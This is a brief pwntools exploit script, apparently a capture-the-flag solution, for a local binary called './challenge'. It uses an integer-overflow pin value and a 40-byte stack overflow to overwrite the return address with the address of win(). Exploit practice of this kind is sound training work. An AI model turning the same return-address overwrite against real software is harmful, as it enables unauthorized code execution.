from pwn import *

path='./challenge'
elf = ELF(path, checksec=True)
context.log_level="DEBUG"
p = process(path)

#finding the win() func addr
win_addr = elf.symbols["win"]
log.info(f"win() address: {hex(win_addr)}")

p.recvuntil(b'Enter Choice:')
p.sendline(b'2')

#interger overflow
p.recvuntil(b"Enter pin: ")
p.sendline(b"2147483648")

#offset=buffer(32)+RBP(8)
OFFSET = 40
payload = b"A" * OFFSET + p64(win_addr)

p.recvuntil(b"tell me something: ")
p.sendline(payload)

p.interactive()

